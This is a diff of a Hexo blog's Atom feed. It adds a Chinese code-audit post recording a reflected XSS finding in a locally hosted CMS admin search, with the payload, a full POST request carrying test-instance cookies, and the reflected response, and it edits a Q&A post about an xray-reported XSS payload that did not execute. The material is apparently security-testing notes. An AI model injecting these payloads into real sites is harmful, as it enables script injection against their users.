@@ -6,7 +6,7 @@
   <link href="https://erickinyae.github.io/atom.xml" rel="self"/>
   
   <link href="https://erickinyae.github.io/"/>
-  <updated>2023-12-06T02:56:13.391Z</updated>
+  <updated>2023-12-06T06:01:21.772Z</updated>
   <id>https://erickinyae.github.io/</id>
   
   <author>
@@ -17,12 +17,24 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>QandA</title>
-    <link href="https://erickinyae.github.io/2023/12/06/QandA-1/"/>
-    <id>https://erickinyae.github.io/2023/12/06/QandA-1/</id>
-    <published>2023-12-06T02:56:13.000Z</published>
-    <updated>2023-12-06T02:56:13.391Z</updated>
+    <title>代码审计-漏洞记录</title>
+    <link href="https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/"/>
+    <id>https://erickinyae.github.io/2023/12/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E8%AE%B0%E5%BD%95/</id>
+    <published>2023-12-06T05:56:28.000Z</published>
+    <updated>2023-12-06T06:01:21.772Z</updated>
     
+    <content type="html"><![CDATA[<hr><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><table><thead><tr><th>URL</th><th><a href="http://localhost:8888/system/cms/content/page?categoryId=">http://localhost:8888/system/cms/content/page?categoryId=</a></th></tr></thead><tbody><tr><td>ParamPosition</td><td><code>body</code></td></tr><tr><td>ParamKey</td><td><code>title</code></td></tr><tr><td>Payload</td><td><code>&quot;&gt;&lt;sCrIpT&gt;alert(1)&lt;/ScRiPt&gt;</code></td></tr><tr><td>Request1</td><td><code>POST /system/cms/content/page?categoryId= HTTP/1.1 Host: localhost:8888 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Content-Length: 118 Accept: text/html, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: vue_admin_template_token=admin-token; sidebarStatus=1; remember-me=YWRtaW46MTcwMjg4MzgxNDczNjo5ZjkwYmVhZTJhYjZiNjQyMzdhODNkZDhkMTRjNDJjZA; XSRF-TOKEN=7846bad7-ebe4-48a8-8cfb-3d72a7ab1564; cms_token=226553f96fb74a328f9798f1424850fe; dreamer-cms-s=c1544459-e4a0-4ea3-99c5-0ddebf2cae66; pb-cms-qq=; pb-cms-email=956968575@qq.com; JSESSIONID=F5F5CB00146F24022BB0EDA921A43D40; pageno_cookie=1; SHIRO_SESSION_ID=69dc1ad1-a73c-458c-87a0-531cf132c0f1; SESSION=ef82c6e0-dade-404a-8183-85c3b67dc7c7; bjui_theme=blue; Idea-fa2b9155=227d5999-324b-42f9-af39-22bf2f71aa49 Origin: http://localhost:8888 Referer: http://localhost:8888/system Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-Requested-With: XMLHttpRequest Accept-Encoding: gzip orderDirection=&amp;orderField=&amp;pageCurrent=1&amp;pageSize=30&amp;status=&amp;title=%22%3E%3CsCrIpT%3Eywrwavrxad%3C%2FsCrIpT%3E&amp;total=</code>Copy</td></tr><tr><td>Response1</td><td>&#96;HTTP&#x2F;1.1 200  Content-Language: zh-CN Content-Type: text&#x2F;html;charset&#x3D;UTF-8 Date: Wed, 06 Dec 2023 02:58:02 GMT <div class="bjui-pageHeader">    <form id="pagerForm" data-toggle="ajaxsearch" action="/system/cms/content/page?categoryId=" method="post">        <input type="hidden" name="pageSize" value="30">        <input type="hidden" name="pageCurrent" value="0">        <input type="hidden" name="orderField" value>        <input type="hidden" name="orderDirection" value>        <div class="bjui-searchBar">            <label>状态:</label>            <select name="status" data-toggle="selectpicker">                <option value selected>所有</option>                <option value="-1"> 删除</option>                <option value="0"> 草稿</option>                <option value="1"> 发布 </option>            </select>             <label>标题：</label><input type="text" value><sCrIpT>ywrwavrxad</sCrIpT>“ name&#x3D;”title” class&#x3D;”form-control” size&#x3D;”15”&gt;             <button type="submit" class="btn-default" data-icon="search">查询</button>             <a class="btn btn-orange" href="javascript:;" data-toggle="reloadsearch" data-clear-query="true" data-icon="undo">刷新全部</a>                         <div class="pull-right">                &lt;!–&lt;button type&#x3D;”button” class&#x3D;”btn-blue” data-url&#x3D;”ajaxDone2.html?id&#x3D;</div></div></form></div></td></tr></tbody></table>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;hr&gt;
+&lt;h1 id=&quot;XSS&quot;&gt;&lt;a href=&quot;#XSS&quot; class=&quot;headerlink&quot; title=&quot;XSS&quot;&gt;&lt;/a&gt;XSS&lt;/h1&gt;&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;URL&lt;/th&gt;
+&lt;th&gt;&lt;a href=&quot;http://localhost:</summary>
+      
     
     
     
@@ -34,9 +46,9 @@
     <link href="https://erickinyae.github.io/2023/12/06/QandA/"/>
     <id>https://erickinyae.github.io/2023/12/06/QandA/</id>
     <published>2023-12-06T02:52:13.000Z</published>
-    <updated>2023-12-06T02:56:05.657Z</updated>
+    <updated>2023-12-06T02:56:47.997Z</updated>
     
-    <content type="html"><![CDATA[<hr><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="xss注入疑问"><a href="#xss注入疑问" class="headerlink" title="xss注入疑问"></a>xss注入疑问</h1><p>项目地址：</p><p><a href="http://localhost:8888/admin/login">http://localhost:8888/admin/login</a> -&gt; 内容管理 -&gt; 查询</p><p><img src="/2023/12/06/QandA/image-20231206105414072.png" alt="image-20231206105414072"></p><p>通过xray扫到了xss注入漏洞，并按照报告注入了相应的负载，但响应中并没有正确执行js脚本。</p><p><img src="/2023/12/06/QandA/image-20231206105529859.png" alt="image-20231206105529859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orderDirection=&amp;orderField=&quot;&gt;&lt;ScRiPt&gt;alert(&quot;123123123&quot;)&lt;/sCrIpT&gt;&amp;pageCurrent=1&amp;pageSize=50&amp;total=</span><br></pre></td></tr></table></figure>]]></content>
+    <content type="html"><![CDATA[<hr><p>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><h1 id="xss注入疑问"><a href="#xss注入疑问" class="headerlink" title="xss注入疑问"></a>xss注入疑问</h1><p>通过xray扫到了xss注入漏洞，并按照报告注入了相应的负载，但响应中并没有正确执行js脚本。</p><p>项目地址：</p><p><a href="http://localhost:8888/admin/login">http://localhost:8888/admin/login</a> -&gt; 内容管理 -&gt; 查询</p><p><img src="/2023/12/06/QandA/image-20231206105414072.png" alt="image-20231206105414072"></p><p><img src="/2023/12/06/QandA/image-20231206105529859.png" alt="image-20231206105529859"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orderDirection=&amp;orderField=&quot;&gt;&lt;ScRiPt&gt;alert(&quot;123123123&quot;)&lt;/sCrIpT&gt;&amp;pageCurrent=1&amp;pageSize=50&amp;total=</span><br></pre></td></tr></table></figure>]]></content>
     
     
       
